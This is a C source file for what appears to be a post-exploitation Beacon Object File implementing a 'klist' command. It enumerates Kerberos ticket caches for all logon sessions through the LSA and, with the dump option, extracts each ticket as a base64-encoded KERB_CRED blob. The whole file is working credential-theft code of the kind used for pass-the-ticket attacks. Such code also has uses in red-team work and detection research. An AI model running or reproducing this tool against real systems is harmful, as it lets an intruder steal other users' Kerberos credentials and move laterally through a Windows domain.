#include "klist.h"

void execute_klist(WCHAR** dispatch, HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
    BOOL highIntegrity = IsHighIntegrity(hToken);
    if (!highIntegrity && !currentLuid) {
        PRINT(dispatch, "[!] Not in high integrity.\n");
        return;
    }
    HANDLE hLsa;
    NTSTATUS status = GetLsaHandle(hToken, highIntegrity, &hLsa);
    if (!NT_SUCCESS(status)) {
        PRINT(dispatch, "[!] GetLsaHandle %ld\n", status);
        return;
    }
    ULONG authPackage;
    LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
    if (!NT_SUCCESS(status)) {
        PRINT(dispatch, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    LOGON_SESSION_DATA sessionData;
    status = GetLogonSessionData(luid, &sessionData);
    if (!NT_SUCCESS(status)) {
        PRINT(dispatch, "[!] GetLogonSessionData: %ld", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
    cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
    for (int i = 0; i < sessionData.sessionCount; i++) {
        if (sessionData.sessionData[i] == NULL) {
            continue;
        }
        PrintLogonSessionData(dispatch, (*sessionData.sessionData[i]));
        PRINT(dispatch, "\n");
        if (highIntegrity) {
            cacheRequest.LogonId = sessionData.sessionData[i]->LogonId;
        } else {
            cacheRequest.LogonId = (LUID){.HighPart = 0, .LowPart = 0};
        }

        SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
        KERB_QUERY_TKT_CACHE_EX_RESPONSE* cacheResponse = NULL;
        KERB_TICKET_CACHE_INFO_EX cacheInfo;
        ULONG responseSize;
        NTSTATUS protocolStatus;
        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &cacheRequest, sizeof(cacheRequest),
                                                      &cacheResponse, &responseSize, &protocolStatus);
        if (!NT_SUCCESS(status)) {
            PRINT(dispatch, "[!] LsaCallAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
            continue;
        }
        // check protocol status?
        if (cacheResponse == NULL) {
            continue;
        }
        int ticketCount = cacheResponse->CountOfTickets;
        PRINT(dispatch, "[*] Cached tickets: (%d)\n\n", ticketCount);
        if (ticketCount > 0) {
            for (int j = 0; j < ticketCount; j++) {
                cacheInfo = cacheResponse->Tickets[j];
                PRINT(dispatch, "\t[%d]\n", j);
                PrintTicketInfo(dispatch, cacheInfo);
                if (dump) {
                    PRINT(dispatch, "\tTicket          : ");
                    PUCHAR ticket;
                    ULONG ticketSize;
                    status = ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket,
                                           &ticketSize);
                    if (!NT_SUCCESS(status)) {
                        PRINT(dispatch, "[!] Could not extract the ticket: %ld\n", status);
                    } else {
                        if (ticketSize > 0) {
                            int len = Base64encode_len(ticketSize);
                            char* encoded = (char*)MSVCRT$calloc(len, sizeof(char));
                            if (encoded == NULL) {
                                PRINT(dispatch, "[!] Base64 - could not allocate memory.\n");
                                continue;
                            }
                            Base64encode(encoded, ticket, ticketSize);
                            PRINT(dispatch, "%s\n\n", encoded);
                            MSVCRT$free(encoded);
                            MSVCRT$free(ticket);
                        }
                    }
                }
                PRINT(dispatch, "\n");
            }
        }
        SECUR32$LsaFreeReturnBuffer(cacheResponse);
    }
    MSVCRT$free(sessionData.sessionData);
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}

NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket,
                       PULONG ticketSize) {
    KERB_RETRIEVE_TKT_REQUEST* retrieveRequest = NULL;
    KERB_RETRIEVE_TKT_RESPONSE* retrieveResponse = NULL;
    ULONG responseSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + targetName.MaximumLength;
    retrieveRequest = (KERB_RETRIEVE_TKT_REQUEST*)MSVCRT$calloc(responseSize, sizeof(KERB_RETRIEVE_TKT_REQUEST));
    if (retrieveRequest == NULL) {
        return STATUS_MEMORY_NOT_ALLOCATED;
    }
    retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    retrieveRequest->LogonId = luid;
    retrieveRequest->TicketFlags = 0;
    retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retrieveRequest->EncryptionType = 0;
    retrieveRequest->TargetName = targetName;
    retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength);

    NTSTATUS protocolStatus;
    NTSTATUS status = STATUS_SUCCESS;
    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse,
                                                  &responseSize, &protocolStatus);
    MSVCRT$free(retrieveRequest);
    if (NT_SUCCESS(status)) {
        if (NT_SUCCESS(protocolStatus)) {
            if (responseSize > 0) {
                ULONG size = retrieveResponse->Ticket.EncodedTicketSize;
                PUCHAR returnTicket = (PUCHAR)MSVCRT$calloc(size, sizeof(UCHAR));
                if (returnTicket != NULL) {
                    MSVCRT$memcpy(returnTicket, retrieveResponse->Ticket.EncodedTicket, size);
                    *ticket = returnTicket;
                    *ticketSize = size;
                } else {
                    status = STATUS_MEMORY_NOT_ALLOCATED;
                }
                SECUR32$LsaFreeReturnBuffer(retrieveResponse);
            }
        } else {
            status = ADVAPI32$LsaNtStatusToWinError(protocolStatus);
        }
    } else {
        status = ADVAPI32$LsaNtStatusToWinError(status);
    }
    return status;
}

void PrintTicketFlags(WCHAR** dispatch, ULONG ticketFlags) {

    char* flags[16] = {
        "name_canonicalize", 
        "anonymous", 
        "ok_as_delegate",
        "?",
        "hw_authent",
        "pre_authent",
        "initial",
        "renewable",
        "invalid",
        "postdated",
        "may_postdate",
        "proxy",
        "proxiable",
        "forwarded",
        "forwardable",
        "reserved"
    };

    for (int i = 0; i < 16; i++) {
        if ((ticketFlags >> (i + 16)) & 1) {
            PRINT(dispatch, "%s ", flags[i]);
        }
    }
    PRINT(dispatch, "(0x%lx)\n", ticketFlags);
}

void PrintTicketInfo(WCHAR** dispatch, KERB_TICKET_CACHE_INFO_EX cacheInfo) {
    PRINT(dispatch, "\tClient name     : %s @ %s\n", GetNarrowStringFromUnicode(cacheInfo.ClientName),
          GetNarrowStringFromUnicode(cacheInfo.ClientRealm));
    PRINT(dispatch, "\tServer name     : %s @ %s\n", GetNarrowStringFromUnicode(cacheInfo.ServerName),
          GetNarrowStringFromUnicode(cacheInfo.ServerRealm));
    SYSTEMTIME st_utc = ConvertToSystemtime(cacheInfo.StartTime);
    PRINT(dispatch, "\tStart time      : %d/%d/%d %d:%d:%d (UTC)\n", st_utc.wDay, st_utc.wMonth, st_utc.wYear,
          st_utc.wHour, st_utc.wMinute, st_utc.wSecond);
    st_utc = ConvertToSystemtime(cacheInfo.EndTime);
    PRINT(dispatch, "\tEnd time        : %d/%d/%d %d:%d:%d (UTC)\n", st_utc.wDay, st_utc.wMonth, st_utc.wYear,
          st_utc.wHour, st_utc.wMinute, st_utc.wSecond);
    st_utc = ConvertToSystemtime(cacheInfo.RenewTime);
    PRINT(dispatch, "\tRenew time      : %d/%d/%d %d:%d:%d (UTC)\n", st_utc.wDay, st_utc.wMonth, st_utc.wYear,
          st_utc.wHour, st_utc.wMinute, st_utc.wSecond);
    PRINT(dispatch, "\tFlags           : ");
    PrintTicketFlags(dispatch, cacheInfo.TicketFlags);
    PRINT(dispatch, "\tEncryption type : %s\n", GetEncryptionTypeString(cacheInfo.EncryptionType));
}
